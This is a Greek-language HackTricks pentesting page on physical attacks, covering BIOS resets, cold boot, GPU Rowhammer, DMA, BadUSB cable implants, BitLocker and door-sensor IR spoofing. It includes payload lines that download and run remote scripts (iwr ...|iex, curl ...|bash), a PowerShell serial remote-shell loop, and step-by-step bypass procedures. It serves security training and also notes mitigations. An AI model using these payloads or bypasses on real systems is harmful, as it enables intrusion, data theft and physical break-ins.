# Φυσικές Επιθέσεις

{{#include ../banners/hacktricks-training.md}}

## Ανάκτηση κωδικού BIOS και ασφάλεια συστήματος

Οι ρυθμίσεις firmware παλαιότερων PC μπορούν να επαναφερθούν αποσυνδέοντας την μπαταρία CMOS ή χρησιμοποιώντας ένα τεκμηριωμένο jumper clear-CMOS. Ο απαιτούμενος χρόνος απενεργοποίησης εξαρτάται από τη μητρική πλακέτα, ενώ οι σύγχρονοι κωδικοί ή τα κλειδιά UEFI μπορεί να αποθηκεύονται σε μη πτητική flash μνήμη, σε embedded controller ή σε συσκευή ασφάλειας και επομένως να διατηρούνται μετά την αφαίρεση της μπαταρίας. Συμβουλευτείτε το εγχειρίδιο της μητρικής πλακέτας ή το εγχειρίδιο service πριν βραχυκυκλώσετε ακίδες· αυτή η διαδικασία μπορεί επίσης να ακυρώσει τις μετρήσεις TPM και να ενεργοποιήσει την ανάκτηση κρυπτογράφησης δίσκου.

Σε παλαιότερα συστήματα x86, εργαλεία όπως τα **killCMOS** και **CmosPwd** μπορούν να εξετάσουν ή να τροποποιήσουν ρυθμίσεις που υποστηρίζονται από CMOS από ένα bootable περιβάλλον. Το CmosPwd αναγνωρίζει μορφές κωδικών από ένα τεκμηριωμένο σύνολο παλαιότερων οικογενειών BIOS και μπορεί να δημιουργήσει αντίγραφο ασφαλείας, να επαναφέρει ή να διαγράψει/τερματίσει την κατάσταση CMOS· οι δημοσιευμένες εκδόσεις του στοχεύουν σε περιβάλλοντα legacy DOS/Windows, Linux, FreeBSD και NetBSD.<sup>[[18]](#references)</sup> Αυτά τα βοηθητικά προγράμματα δεν είναι γενικά εργαλεία αφαίρεσης κωδικών UEFI και απαιτούν επαρκή πρόσβαση στο hardware/firmware.

Ορισμένα firmware laptop εμφανίζουν έναν κωδικό πρόκλησης ειδικό για τον κατασκευαστή μετά από αρκετές αποτυχημένες προσπάθειες εισαγωγής κωδικού. Βάσεις δεδομένων όπως το [bios-pw.org](https://bios-pw.org) μπορούν να υπολογίσουν legacy κωδικούς ανάκτησης κατασκευαστών για ορισμένα μοντέλα, όμως πολλά συστήματα εφαρμόζουν κλείδωμα χωρίς κωδικό πρόκλησης που μπορεί να υπολογιστεί. Θεωρήστε κάθε κωδικό που δημιουργείται ως ειδικό για το μοντέλο και αποφύγετε την εξάντληση μόνιμων μετρητών προσπαθειών.

### Ασφάλεια UEFI

Για σύγχρονα συστήματα **UEFI**, το CHIPSEC μπορεί να ελέγξει τις προστασίες των μεταβλητών Secure Boot. Ξεκινήστε με τον έλεγχο που δεν τροποποιεί το σύστημα παρακάτω· η προαιρετική λειτουργία `-a modify` επιχειρεί σκόπιμα να καταστρέψει μεταβλητές και θα πρέπει να χρησιμοποιείται μόνο σε ανακτήσιμο εργαστηριακό σύστημα. Το ίδιο το CHIPSEC προειδοποιεί ότι ο privileged driver και η πρόσβαση hardware χαμηλού επιπέδου που παρέχει είναι ακατάλληλα για endpoints παραγωγής.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Ανάλυση RAM και Cold Boot Attacks

Η DRAM δεν χάνει κάθε bit αμέσως όταν σταματήσει η ανανέωση. Ο ρυθμός αποσύνθεσης διαφέρει σημαντικά ανάλογα με την τεχνολογία του module και τη θερμοκρασία· η ψύξη μπορεί να διατηρήσει χρήσιμα δεδομένα για πολύ περισσότερο από έναν κύκλο τερματισμού και επανεκκίνησης χωρίς ψύξη. Ένα cold-boot attack κάνει γρήγορη επανεκκίνηση σε ένα μικρό περιβάλλον απόκτησης ή μεταφέρει ένα ψυχόμενο module, καταγράφει την ακατέργαστη μνήμη και ανακατασκευάζει cryptographic keys παρά την αποσύνθεση των bits. Ένα disk-copy utility δεν είναι αυτόματα physical-memory imager, και το Volatility αναλύει ένα capture αντί να το αποκτά· χρησιμοποιήστε ένα κατάλληλο για την πλατφόρμα και επικυρωμένο acquisition tool.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Against Page Tables

Τα σύγχρονα GPU Rowhammer attacks γίνονται πολύ πιο χρήσιμα όταν στοχεύουν **GPU virtual-memory metadata** αντί για συνηθισμένα buffers. Πρόσφατη έρευνα σε **GDDR6 NVIDIA Ampere GPUs** δείχνει ότι ένας attacker που εκτελεί unprivileged CUDA code μπορεί να δημιουργήσει GPU-specific hammering patterns, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει paging structures σε ευάλωτες γραμμές και στη συνέχεια να κάνει bit flips στο **last-level page table** ή σε ένα ενδιάμεσο **page directory**. Μόλις καταστραφεί μία translation entry, ο attacker μπορεί να αποκτήσει **arbitrary GPU memory read/write** και στη συνέχεια να κάνει pivot για compromise του host.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** στη GDDR6 και δημιουργήστε refresh-aware / non-uniform hammering patterns που παρακάμπτουν mitigations μέσα στη DRAM.
2. **Massage GPU allocations**, ώστε ο driver να τοποθετεί τις page-translation structures σε hammerable physical locations αντί να τις διατηρεί στο προεπιλεγμένο protected pool. Στην πράξη, αυτό μπορεί να σημαίνει εξάντληση της low-memory page-table region και spraying μεγάλων sparse UVM mappings με ελεγχόμενα strides.
3. **Flip translation metadata**, όπως **PFN** ή aperture-related bits, μέσα σε ένα page-table / page-directory entry, ώστε η virtual page που ελέγχει ο attacker να επιλύεται σε page-table pages, arbitrary GPU memory ή host-visible system mappings.
4. Επαναχρησιμοποιήστε το forged mapping για να ξαναγράψετε πρόσθετες translation entries και να κάνετε escalation σε **arbitrary GPU memory read/write** μεταξύ GPU contexts.

### Host Pivot and Mitigations

- Με **IOMMU disabled**, τα forged system-aperture mappings μπορούν να εκθέσουν arbitrary **host physical memory** στη GPU, μετατρέποντας το GPU primitive σε πλήρες host compromise.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Το **GDDRHammer** στοχεύει last-level page-table entries, ενώ το **GeForge** δείχνει ότι η καταστροφή ενός page-directory level μπορεί να είναι ευκολότερη, επειδή ένα bit flip μπορεί να επαναστοχεύσει ένα μεγαλύτερο translation subtree. Μην αντιμετωπίζετε μόνο ένα paging layer ως κρίσιμο για την ασφάλεια.<sup>[[1]](#references)[[2]](#references)</sup>
- Το **IOMMU** εξακολουθεί να είναι σημαντικό, επειδή αποκλείει το άμεσο arbitrary-host-memory path που χρησιμοποιούν τα GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρες mitigation**. Το **GPUBreach** δείχνει ένα second-stage pivot, όπου ο attacker καταστρέφει GPU-writable, driver-owned CPU buffers και στη συνέχεια ενεργοποιεί memory-safety bugs του NVIDIA driver, ώστε να αποκτήσει kernel write primitive και ένα **root shell**, ακόμη και με ενεργοποιημένο IOMMU.<sup>[[3]](#references)</sup>
- Το **System-level ECC** είναι ένα πρακτικό hardening step σε υποστηριζόμενες workstation/server GPUs. Οι consumer GPUs χωρίς ECC εκθέτουν μια ασθενέστερη defense surface.<sup>[[4]](#references)</sup>
- Αυτά τα attacks δεν είναι καθαρά θεωρητικά: το **GeForge** ανέφερε **1,171** bit flips σε ένα RTX 3060 και **202** σε ένα RTX A6000, αριθμός αρκετός για τη δημιουργία μιας λειτουργικής host-privilege-escalation chain.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

Το **Inception** επιδεικνύει **DMA-based memory acquisition and patching** μέσω interfaces όπως το FireWire και πρώιμων διαμορφώσεων Thunderbolt, συμπεριλαμβανομένων historical login-bypass signatures. Δεν είναι απλώς «ineffective against Windows 10»: η exploitability εξαρτάται από το interface, το target build, την IOMMU policy, την κατάσταση κλειδώματος και το αν υποστηρίζεται και έχει ενεργοποιηθεί το Windows Kernel DMA Protection. Τα Windows 10 version 1803 και νεότερα εισήγαγαν το Kernel DMA Protection σε συμβατές πλατφόρμες, αλλάζοντας ουσιαστικά το attack surface.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB for System Access

Σε ένα μη κρυπτογραφημένο ή ήδη ξεκλειδωμένο Windows volume, ένα offline environment μπορεί να αντικαταστήσει accessibility binaries, όπως τα **sethc.exe** ή **Utilman.exe**, με το **cmd.exe**, παρέχοντας ένα SYSTEM command prompt όταν εκτελείται η αντίστοιχη συντόμευση της logon screen. Εργαλεία όπως το **chntpw** μπορούν να επεξεργαστούν local SAM account data. Αυτές οι μέθοδοι δεν παρακάμπτουν ένα κλειδωμένο BitLocker volume και μπορούν να καταστρέψουν credentials που προστατεύονται με DPAPI/EFS· διατηρήστε forensic copies και backups.

Το **Kon-Boot** είναι ένα commercial boot-time authentication-bypass tool για υποστηριζόμενες διαμορφώσεις Windows/macOS. Η συμβατότητα εξαρτάται από το OS, το firmware mode, το Secure Boot και τη ρύθμιση disk encryption· δεν αποκρυπτογραφεί ένα BitLocker-locked volume.<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- Τα **Delete/Supr**, F2, F10 ή κάποιο άλλο vendor key μπορεί να ανοίξουν το firmware setup.
- Το **F8** εισέρχεται στα legacy Windows advanced boot options μόνο σε διαμορφώσεις όπου αυτή η διαδρομή παραμένει ενεργοποιημένη· η είσοδος στο current recovery διαφέρει.
- Το πάτημα του **Shift** μπορεί να καταστείλει το Windows automatic logon σε ορισμένες διαμορφώσεις, αν και οι policy/registry settings μπορούν να απενεργοποιήσουν αυτή τη συμπεριφορά.<sup>[[17]](#references)</sup>

### BAD USB Devices

Συσκευές όπως το **USB Rubber Ducky** και τα Teensy boards μπορούν να εμφανιστούν ως trusted HID keyboards και να εισάγουν προκαθορισμένα keystrokes. Το payload αρχικά έχει τα privileges και την desktop access του logged-on session· τα UAC prompts, το screen locking, το keyboard layout, το timing και η endpoint USB policy εξακολουθούν να το περιορίζουν.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator ή backup privileges μπορούν να δημιουργήσουν ένα shadow copy ή να αποθηκεύσουν registry hives, ώστε να αποκτηθούν locked files όπως τα **SAM** και **SYSTEM**. Αυτή είναι post-compromise collection technique και όχι privilege bypass, και θα πρέπει να συσχετίζεται με events των `diskshadow`/VSS και registry-hive export.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implants βασισμένα σε ESP32-S3, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε USB-A→USB-C ή USB-C↔USB-C cables, εμφανίζονται αποκλειστικά ως USB keyboard και εκθέτουν το C2 stack τους μέσω Wi-Fi. Ο operator χρειάζεται μόνο να τροφοδοτήσει το cable από το victim host, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και password `123456789` και να μεταβεί στο [http://cable-wind.local/](http://cable-wind.local/) (ή στη DHCP address του), για να αποκτήσει πρόσβαση στο embedded HTTP interface.<sup>[[8]](#references)</sup>
- Το browser UI παρέχει tabs για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* και *Config*. Τα αποθηκευμένα payloads διαθέτουν tags ανά OS, τα keyboard layouts αλλάζουν on the fly και τα VID/PID strings μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά peripherals.
- Επειδή το C2 βρίσκεται μέσα στο cable, ένα phone μπορεί να κάνει stage τα payloads, να ενεργοποιεί την εκτέλεση και να διαχειρίζεται τα Wi-Fi credentials χωρίς χρήση του network του οργανισμού — χρήσιμο για physical intrusions μικρού dwell-time.

### OS-aware AutoExec payloads

- Οι κανόνες AutoExec συνδέουν ένα ή περισσότερα payloads με άμεση εκτέλεση μετά το USB enumeration. Το implant εκτελεί lightweight OS fingerprinting και επιλέγει το αντίστοιχο script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η εκτέλεση είναι unattended, η απλή αντικατάσταση ενός charging cable μπορεί να επιτύχει αρχική πρόσβαση “plug-and-pwn” στο context του logged-on user.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Ένα αποθηκευμένο payload ανοίγει μια console και επικολλά έναν loop που εκτελεί οτιδήποτε φτάνει στη νέα USB serial device. Μια minimal Windows variant είναι:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Το implant διατηρεί ανοιχτό το USB CDC channel, ενώ το ESP32-S3 εκκινεί έναν TCP client (Python script, Android APK ή desktop executable) προς τον operator. Οποιαδήποτε bytes πληκτρολογούνται στο TCP session προωθούνται στον παραπάνω serial loop, παρέχοντας remote command execution ακόμη και σε air-gapped hosts. Η έξοδος είναι περιορισμένη, επομένως οι operators εκτελούν συνήθως blind commands (δημιουργία λογαριασμών, staging πρόσθετων εργαλείων κ.λπ.).

### Επιφάνεια ενημέρωσης HTTP OTA

- Το τεκμηριωμένο interface του Evil Crow Cable Wind εκθέτει ένα unauthenticated firmware-update endpoint στο `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Οι field operators μπορούν να κάνουν hot-swap σε features (π.χ. flash USB Army Knife firmware) κατά τη διάρκεια της engagement χωρίς να ανοίξουν το cable, επιτρέποντας στο implant να μεταβεί σε νέες δυνατότητες ενώ παραμένει συνδεδεμένο στο target host.

## Παράκαμψη της κρυπτογράφησης BitLocker

Μια εξουσιοδοτημένη forensic απόκτηση δεδομένων από ένα live ή πρόσφατα ενεργό σύστημα μπορεί να περιέχει ένα BitLocker volume master key ή σχετικό key material όσο το volume είναι ξεκλείδωτο. Commercial tools όπως τα Elcomsoft Forensic Disk Decryptor και Passware Kit Forensic μπορούν να αναζητήσουν σε υποστηριζόμενα memory images, hibernation files ή crash dumps, όμως η επιτυχία δεν είναι εγγυημένη. Τα σύγχρονα Windows κρυπτογραφούν επίσης τα crash dumps όταν είναι ενεργοποιημένο το BitLocker, ενώ ένα αποθηκευμένο 48-digit recovery password είναι διαφορετικό artifact από ένα volume key που βρίσκεται στη μνήμη.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering για την Προσθήκη Recovery Key

Ένας attacker που πείθει έναν administrator να εκτελέσει BitLocker-management commands μπορεί να προσθέσει ένα recovery-password, external-key ή άλλο protector και στη συνέχεια να το καταγράψει. Ένα recovery password δεν μπορεί να είναι μια αυθαίρετη συμβολοσειρά από μηδενικά: τα BitLocker numerical recovery passwords έχουν επικυρωμένη μορφή 48 ψηφίων. Η σχετική authorized-administration syntax είναι `manage-bde -protectors -add C: -recoverypassword`; απαριθμήστε τα protectors που προκύπτουν με `manage-bde -protectors -get C:`. Παρακολουθείτε τις προσθήκες protectors και διασφαλίζετε ότι το νέο recovery material αποθηκεύεται με escrow μόνο σε εγκεκριμένες τοποθεσίες.<sup>[[16]](#references)</sup>

---

## Εκμετάλλευση Chassis Intrusion / Maintenance Switches για Factory-Reset του BIOS

Πολλά σύγχρονα laptops και desktops μικρού form factor περιλαμβάνουν έναν **chassis-intrusion switch**, τον οποίο παρακολουθούν ο Embedded Controller (EC) και το BIOS/UEFI firmware.  Ενώ ο κύριος σκοπός του switch είναι να ενεργοποιεί μια alert όταν ανοίγει μια συσκευή, οι vendors μερικές φορές υλοποιούν ένα **undocumented recovery shortcut**, το οποίο ενεργοποιείται όταν το switch αλλάζει κατάσταση με συγκεκριμένο pattern.<sup>[[5]](#references)[[6]](#references)</sup>

### Πώς λειτουργεί το Attack

1. Το switch είναι συνδεδεμένο σε ένα **GPIO interrupt** στον EC.
2. Το firmware που εκτελείται στον EC καταγράφει το **timing και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα hard-coded pattern, ο EC καλεί μια *mainboard-reset* routine που **διαγράφει τα περιεχόμενα του system NVRAM/CMOS**.
4. Στο επόμενο boot, τα επηρεαζόμενα models φορτώνουν reset firmware state. Ανάλογα με τον vendor και το revision, η κατάσταση που διαγράφηκε μπορεί να περιλαμβάνει supervisor password, custom boot settings ή enrolled Secure Boot keys· η κατάσταση του TPM και οι επιπτώσεις στην disk encryption πρέπει να αξιολογούνται ξεχωριστά.

> Ένα firmware reset μπορεί να επαναφέρει τις επιλογές external-boot, αλλά **δεν** αποκρυπτογραφεί το storage. Το BitLocker ή άλλο full-disk encryption system μπορεί να εισέλθει σε recovery μετά από αλλαγές στο TPM/firmware και να συνεχίσει να προστατεύει το internal drive χωρίς recovery key.<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

Το recovery shortcut για το Framework 13 (11th/12th/13th-gen) είναι:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Μετά τον δέκατο κύκλο, το EC θέτει ένα flag που δίνει εντολή στο BIOS να διαγράψει το NVRAM στην επόμενη επανεκκίνηση. Η gesamte διαδικασία διαρκεί ~40 s και απαιτεί **τίποτα περισσότερο από ένα κατσαβίδι**.<sup>[[5]](#references)</sup>

### Γενική διαδικασία εκμετάλλευσης

1. Ενεργοποιήστε ή εκτελέστε αναστολή-επανεκκίνηση στο target, ώστε να εκτελείται το EC.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκαλύψετε τον διακόπτη intrusion/maintenance.
3. Αναπαραγάγετε το μοτίβο εναλλαγής που απαιτεί ο συγκεκριμένος vendor (συμβουλευτείτε την τεκμηρίωση, forums ή κάντε reverse-engineer το firmware του EC).
4. Επανασυναρμολογήστε και επανεκκινήστε τη συσκευή και, στη συνέχεια, ελέγξτε ποιες ρυθμίσεις firmware και credentials άλλαξαν πράγματι.
5. Εφόσον υπάρχει εξουσιοδότηση και είναι διαθέσιμο το external boot, εκκινήστε ένα ελεγχόμενο live image. Μόλις ένας εσωτερικός τόμος ξεκλειδωθεί νόμιμα (ή αν δεν ήταν ποτέ κρυπτογραφημένος), το live περιβάλλον μπορεί να αποκτήσει credentials και δεδομένα ή να επιθεωρήσει το EFI System Partition. Η τροποποίηση αυτού του partition για την εγκατάσταση ενός EFI implant είναι επίμονη και ιδιαίτερα παρεμβατική, ενώ εξακολουθεί να περιορίζεται από τα Secure Boot, measured boot, την προστασία εγγραφής του firmware και την παρακολούθηση endpoint. Η κρυπτογραφημένη αποθήκευση παραμένει μη προσβάσιμη χωρίς το κλειδί ή το recovery material.

### Ανίχνευση και μετριασμός

* Καταγράφετε τα συμβάντα chassis-intrusion στην κονσόλα διαχείρισης του OS και συσχετίστε τα με μη αναμενόμενα BIOS resets.
* Χρησιμοποιείτε **tamper-evident seals** σε βίδες/καλύμματα για την ανίχνευση ανοίγματος.
* Διατηρείτε τις συσκευές σε **φυσικά ελεγχόμενους χώρους**· θεωρείτε ότι η φυσική πρόσβαση ισοδυναμεί με πλήρη παραβίαση.
* Όπου είναι διαθέσιμο, απενεργοποιήστε τη λειτουργία “maintenance switch reset” του vendor ή απαιτήστε πρόσθετη cryptographic authorisation για τα NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Χαρακτηριστικά αισθητήρα
- Οι εμπορικοί αισθητήρες “wave-to-exit” συνδυάζουν έναν near-IR LED emitter με ένα receiver module τύπου τηλεχειριστηρίου TV, το οποίο αναφέρει logic high μόνο αφού ανιχνεύσει πολλαπλούς παλμούς (~4–10) του σωστού carrier (≈30 kHz).<sup>[[7]](#references)</sup>
- Ένα πλαστικό shroud εμποδίζει τον emitter και τον receiver να είναι στραμμένοι απευθείας ο ένας προς τον άλλο, οπότε ο controller θεωρεί ότι οποιοσδήποτε επικυρωμένος carrier προήλθε από κοντινή ανάκλαση και ενεργοποιεί ένα relay που ανοίγει το door strike.
- Μόλις ο controller θεωρήσει ότι υπάρχει target, συχνά αλλάζει το outbound modulation envelope, όμως ο receiver εξακολουθεί να αποδέχεται οποιοδήποτε burst ταιριάζει με τον filtered carrier.

### Ροή επίθεσης
1. **Καταγράψτε το emission profile** – συνδέστε έναν logic analyser στους ακροδέκτες του controller, ώστε να καταγράψετε τόσο τις pre-detection όσο και τις post-detection κυματομορφές που οδηγούν το εσωτερικό IR LED.
2. **Κάντε replay μόνο της “post-detection” κυματομορφής** – αφαιρέστε ή αγνοήστε τον stock emitter και οδηγήστε ένα εξωτερικό IR LED με το ήδη ενεργοποιημένο pattern από την αρχή. Επειδή ο receiver ενδιαφέρεται μόνο για τον αριθμό/τη συχνότητα των παλμών, αντιμετωπίζει τον spoofed carrier ως γνήσια ανάκλαση και ενεργοποιεί τη γραμμή του relay.
3. **Περιορίστε τη μετάδοση** – μεταδώστε τον carrier σε ρυθμισμένα bursts (π.χ. δεκάδες milliseconds ενεργό, παρόμοιο διάστημα ανενεργό), ώστε να αποδώσετε τον ελάχιστο αριθμό παλμών χωρίς να κορεστεί το AGC του receiver ή η λογική διαχείρισης παρεμβολών. Η συνεχής εκπομπή απευαισθητοποιεί γρήγορα τον αισθητήρα και εμποδίζει την ενεργοποίηση του relay.

### Reflective Injection μεγάλης εμβέλειας
- Η αντικατάσταση του bench LED με μια high-power IR diode, MOSFET driver και focusing optics επιτρέπει αξιόπιστη ενεργοποίηση από απόσταση ~6 m.
- Ο attacker δεν χρειάζεται line-of-sight προς το receiver aperture· η στόχευση της δέσμης σε εσωτερικούς τοίχους, ράφια ή door frames που είναι ορατά μέσα από γυαλί επιτρέπει στην ανακλώμενη ενέργεια να εισέλθει στο field of view ~30° και να μιμηθεί ένα κοντινό hand wave.
- Επειδή οι receivers αναμένουν μόνο ασθενείς ανακλάσεις, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να ανακλαστεί σε πολλαπλές επιφάνειες και να παραμείνει πάνω από το detection threshold.

### Weaponised Attack Torch
- Η ενσωμάτωση του driver μέσα σε έναν εμπορικό φακό αποκρύπτει το εργαλείο σε κοινή θέα. Αντικαταστήστε το ορατό LED με ένα high-power IR LED προσαρμοσμένο στη ζώνη του receiver, προσθέστε ένα ATtiny412 (ή παρόμοιο) για τη δημιουργία των bursts ≈30 kHz και χρησιμοποιήστε ένα MOSFET για να απορροφά το ρεύμα του LED.
- Ένας telescopic zoom lens περιορίζει τη δέσμη για range/precision, ενώ ένας vibration motor υπό τον έλεγχο του MCU παρέχει haptic confirmation ότι η modulation είναι ενεργή, χωρίς εκπομπή ορατού φωτός.
- Η εναλλαγή μεταξύ αρκετών αποθηκευμένων modulation patterns (ελαφρώς διαφορετικές carrier frequencies και envelopes) αυξάνει τη συμβατότητα μεταξύ rebranded sensor families, επιτρέποντας στον operator να σαρώσει ανακλαστικές επιφάνειες μέχρι να ακουστεί το relay να κάνει click και να απελευθερωθεί η πόρτα.

---

## References

- [1] [GDDRHammer: Ιδιαίτερα disruptive γραμμές DRAM — Rowhammer επιθέσεις μεταξύ components από σύγχρονες GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering μνήμης GDDR για τη δημιουργία GPU Page Tables για διασκέδαση και κέρδος](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Επιθέσεις Privilege Escalation σε GPUs με χρήση Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - Ιούλιος 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Πατήστε εδώ για pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Οδηγός Mainboard Reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Παράκαμψη IR No-Touch Exit Sensors με ένα Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking με Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Επίσημη τεκμηρίωση και πληροφορίες συμβατότητας του Kon-Boot](https://kon-boot.com/)
- [11] [Τεκμηρίωση CHIPSEC - Προστασίες μεταβλητών Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks σε Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - χειρισμός physical memory μέσω DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Τεκμηρίωση Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Οδηγός λειτουργιών BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - κράτημα του Shift και συμπεριφορά automatic logon](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Τεκμηρίωση και downloads του CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
